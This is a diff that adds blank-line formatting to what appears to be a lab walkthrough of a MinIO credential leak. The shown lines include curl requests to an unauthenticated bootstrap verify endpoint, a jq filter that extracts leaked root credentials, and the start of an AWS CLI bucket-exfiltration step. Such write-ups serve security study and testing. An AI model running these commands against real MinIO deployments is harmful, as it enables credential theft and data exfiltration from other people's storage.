@@ -17,6 +17,7 @@ In vulnerable cluster deployments, MinIO exposed an unauthenticated HTTP POST en
 ## Exploitation Walkthrough
 
 ### 1. Querying the Bootstrap Verify Endpoint
+
 Send an unauthenticated POST request to `/minio/bootstrap/v1/verify`:
 
 ```bash
@@ -24,6 +25,7 @@ curl -i -s -X POST http://localhost:9000/minio/bootstrap/v1/verify
 ```
 
 ### 2. Extracting Leaked Credentials
+
 The response contains a JSON object listing system environment variables:
 
 ```bash
@@ -31,6 +33,7 @@ curl -s -X POST http://localhost:9000/minio/bootstrap/v1/verify | jq '{MinioEnv:
 ```
 
 Leaked values include:
+
 ```json
 {
   "MINIO_ROOT_USER": "admin",
@@ -39,6 +42,7 @@ Leaked values include:
 ```
 
 ### 3. S3 Bucket Exfiltration using AWS CLI
+
 Configure the AWS CLI with the stolen MinIO root credentials:
 
 ```bash
